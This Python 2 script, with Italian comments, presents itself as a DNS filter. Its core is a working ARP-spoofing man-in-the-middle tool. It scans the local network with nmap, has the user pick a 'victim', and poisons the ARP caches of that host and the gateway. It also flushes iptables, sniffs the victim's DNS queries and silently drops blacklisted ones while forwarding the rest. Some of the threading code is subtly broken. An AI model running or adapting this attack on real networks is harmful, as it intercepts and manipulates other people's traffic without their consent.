#   Dns filter
#   Author: Federico Germinario 545081

#!/usr/bin/python

from subprocess import Popen, PIPE
from scapy.all import *
import nmap
import os
import threading
import time
import argparse
import sys
import datetime
import pyfiglet 
from Hashtable import Hashtable

log = "log.txt"   
policy= "policy.txt"
policy_blackList = "blacklist-hostnames.txt"

def initial_setup():                    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")   # Abilito l'ip forward
    os.system("iptables --flush")                         # Scrivo le regole del firewall iptables
    os.system("iptables --zero")
    os.system("iptables --delete-chain")
    os.system("iptables -F -t nat")
    os.system("iptables -A FORWARD -p UDP --dport 53 -j REJECT")
    
def write_log(txt):        # Funzione per scivere sul file di log   
    f = open("log.txt", "a")
    log = "[" + str(datetime.datetime.now()) + "]: " + txt + "\n"
    f.write(log)

def read_filter_list():  # Funzione per leggere il file di policy
    try:
        f = open(policy, "r")
        return f.readlines()
    except IOError:
        print "[!!!] Could not read file:", policy 
        return None

def read_blacklist():  # Funzione per leggere il file blacklist
    try:
        f = open(policy_blackList, "r")
        return f.readlines()
    except IOError:
        print "[!!!] Could not read file:", policy_blackList 
        return None

def nmap_arp_scan(range):   # Funzione che esegue una scansione ARP Scan con Nmap 
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=range, arguments='-sP')
        hosts_list = [(x, nm[x]['status']['state'], nm[x]['addresses']) for x in nm.all_hosts()]
        ip = {}
        for host, status, add in hosts_list:
            mac = add.get('mac')
            if(mac == None):
                mac = 'Unknown'
            ip[host] = status, mac
        return ip
    except KeyboardInterrupt:
        print "Stop scan"
        stop("null", "null", "null", "null")

def stop(gateway_ip, target_ip, target_mac, gateway_mac):   # Funzione per fermare l'attacco
    print "Keyboard Interrupt (CTRL+C)...Closing..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables --flush")	
    if gateway_ip != "null" and target_ip != "null" and target_mac != "null" and gateway_mac != "null":
        restore_target(gateway_ip, target_ip, target_mac, gateway_mac)
    exit()

def selection(ip):              # Funzione per selezionare una vittima dalla scansione effettuata
    try:
        iplist = []
        i = 0
        for x in ip.keys():
            target_mac = ip[x][1]
            print "Target: [{}] | IP: {} [{}]".format(i, x, target_mac)
            iplist.append([x, target_mac.split()[0]])
            i+=1
        sel = input("Selection Number: ")
        target_ip = iplist[sel][0]
        target_mac = iplist[sel][1]
        return target_ip, target_mac
    except KeyboardInterrupt:
        print "\nStop..."
        stop("null", "null", "null", "null")

def get_gateway_ip():                           # Funzione che restituisce l'ip del gateway
    cmd = Popen(["ip", "route"], stdout=PIPE)
    gateway_ip = cmd.communicate()[0].split(" ")
    return gateway_ip[2]

def get_gateway_mac(gateway_ip):     # Funzione che restituisce il mac del gateway
    return srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gateway_ip), timeout=10)[0][0][1][ARP].hwsrc

def arp_poisoning(gateway_ip, target_ip, gateway_mac, target_mac):       # Thread ARP Spoofing
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print '[*] Beginning the ARP poison'

    while True:
        send(poison_target, verbose = False)
        send(poison_gateway, verbose = False)
        time.sleep(2)

def restore_target(gateway_ip, target_ip, gateway_mac, target_mac):  
    send(ARP(op=2, 
            hwsrc=gateway_mac,   
            psrc= gateway_ip, 
            hwdst= "ff:ff:ff:ff:ff:ff" , 
            pdst= target_ip), 
        count=5,
        verbose=0)
    send(ARP(op=2, 
            hwsrc=target_mac, 
            psrc= target_ip, 
            hwdst= "ff:ff:ff:ff:ff:ff", 
            pdst= target_ip),   
        count=5,
        verbose=0)
    print "[*] ARP Table restored to normal!"

def forwording_dns(pkt):                            # Thread forwording pacchetti dns non in blacklist
    print "Forwarding: " + pkt[DNSQR].qname
    response = sr1(
        IP(dst='8.8.8.8')/
            UDP(sport=pkt[UDP].sport)/
            DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
        verbose=0,
        timeout=50
    )
    if response != None:
        resp_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport)/DNS()
        resp_pkt[DNS] = response[DNS]
        send(resp_pkt, verbose=0)
        print "Responding to " + pkt[IP].src + "\n"

def sniff_callback(table_filter, table_blacklist):     
    def forwording(pkt):
        dns = pkt['DNS']
        qname = dns.qd.qname.rstrip('.')
        if (table_filter == None or table_filter.search(qname + "\n") == None) and (table_blacklist == None or table_blacklist.search(qname + "\n") == None):
            if (
                DNS in pkt and
                pkt[DNS].opcode == 0 and
                pkt[DNS].ancount == 0
            ):
                forwording = threading.Thread(target=forwording_dns(pkt), args=[pkt])
                forwording.start()   
        else:
            write_log("Request dns " + qname + " dropped!")
            print "Request dns " + qname + " dropped!"
    return forwording

def sniff_thread(iface, target_ip, table_filter, table_blacklist):              # Thread sniffing pacchetti dns
    print '[*] Beginning sniffing'
    dns_filter = "udp and port 53 and src " + target_ip
    pkt = sniff(iface=iface, filter = dns_filter, prn=sniff_callback(table_filter, table_blacklist), store=0)  
	
def parse():
    parser = argparse.ArgumentParser(description='DNS filtering')
    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface', default=False)
    parser.add_argument('-r', '--range', help='Local network scan range', action='store', dest='range', default=False)
    args = parser.parse_args()
    if len(sys.argv) == 1:
    	parser.print_help()
    	sys.exit(1)
    elif not args.range:
    	parser.error("Invalid range specification")
    	sys.exit(1)
    elif not args.interface:
    	parser.error("No network interface given")
    	sys.exit(1)
    return args.interface, args.range 

if __name__ == '__main__':
    try:
        result = pyfiglet.figlet_format("Dns filter") 
        print(result) 
        print "[*] Initial setup"
        initial_setup()
        print "[*] Reading file in progress..."
        filter_list = read_filter_list()
        blacklist = read_blacklist()
        if filter_list == None or blacklist == None:
            exit()
        if len(filter_list) == 0:
            table_filter = None
        else:
            table_filter = Hashtable(len(filter_list))
            for line in filter_list:
                table_filter.insert(line, line)
        
        if len(blacklist) == 0:
            table_blacklist = None
        else:
            table_blacklist = Hashtable(len(blacklist))
            for line in blacklist:
                table_blacklist.insert(line, line)
        print "[*] Reading completed!"

        iface, range = parse()                   
        gateway_ip = get_gateway_ip()
        gateway_mac = get_gateway_mac(gateway_ip)
        if gateway_mac == 'Unknown':
            print '[!!!] Cannot find gateway mac'
            exit()
        print '\n[*] Interface: %s' %iface
        print '[*] Range scan: %s' %range
        print '[*] Gateway: %s [%s]' %(gateway_ip, gateway_mac)
        print '\n[*] Network scan in progress ...'
        scan = nmap_arp_scan(range)               #Scansione arp della rete 
        target_ip, target_mac = selection(scan) #Seleziono la vittima
        if target_mac == "Unknown":
            print "[!!!] Mac not found"
            exit()
        print '\n[*] Target: %s [%s]' %(target_ip, target_mac)
        arp = threading.Thread(target=arp_poisoning, args=[gateway_ip, target_ip, gateway_mac, target_mac])  
        arp.setDaemon(True)
        arp.start()                                 #Start l'ARP Spoofing   
        sniff = threading.Thread(target=sniff_thread(iface, target_ip, table_filter, table_blacklist), args=[iface, target_ip, table_filter, table_blacklist])
        sniff.setDaemon(True)
        sniff.start()                               #Start sniffing
        while True:
            pass
    except KeyboardInterrupt:
        print "\nStop..."
        stop(gateway_ip, target_ip, target_mac, gateway_mac)